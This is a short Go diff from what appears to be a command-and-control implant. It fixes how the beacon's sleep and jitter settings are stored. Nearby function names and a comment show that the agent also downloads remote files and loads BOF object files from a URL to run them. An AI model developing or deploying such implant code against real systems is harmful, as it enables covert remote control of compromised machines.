@@ -129,16 +129,20 @@ func handleDownloadURL(task Task, res *TaskResult) {
 func handleSetSleep(task Task, res *TaskResult) {
 	parts := strings.Split(task.Command, ",")
 	if len(parts) >= 1 {
-		if i, err := strconv.Atoi(strings.TrimSpace(parts[0])); err == nil {
-			Interval = i
+		if i, err := strconv.Atoi(strings.TrimSpace(parts[0])); err == nil && i > 0 {
+			IntervalStr = strconv.Itoa(i)
 		}
 	}
 	if len(parts) >= 2 {
 		if j, err := strconv.Atoi(strings.TrimSpace(parts[1])); err == nil {
-			Jitter = j
+			JitterStr = strconv.Itoa(j)
 		}
 	}
-	res.Output = fmt.Sprintf("sleep set to %d s, jitter %d%%", Interval, Jitter)
+	// Re-derive the typed globals from the canonical string config so the new
+	// sleep/jitter actually take effect and survive a later reparse (which
+	// rebuilds Interval/Jitter from *Str).
+	reparseNetworkConfig()
+	res.Output = fmt.Sprintf("sleep set to %s s, jitter %s%%", IntervalStr, JitterStr)
 }
 
 // handleBOFInfection downloads a BOF .o file from the given URL and executes
